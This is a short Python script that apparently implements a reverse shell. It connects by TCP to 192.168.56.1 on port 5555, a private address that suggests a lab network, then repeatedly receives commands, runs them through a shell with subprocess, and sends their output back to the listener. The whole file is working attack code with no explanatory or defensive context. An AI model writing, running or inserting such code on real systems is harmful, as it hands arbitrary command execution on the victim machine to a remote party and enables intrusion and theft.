import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.56.1"
port = 5555
s.connect((host, port))
while True:
	cmd = s.recv(1024)
	cmd = cmd.decode('utf-8')
	sub = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	res = sub.stdout.read()+sub.stderr.read()
	s.send(res)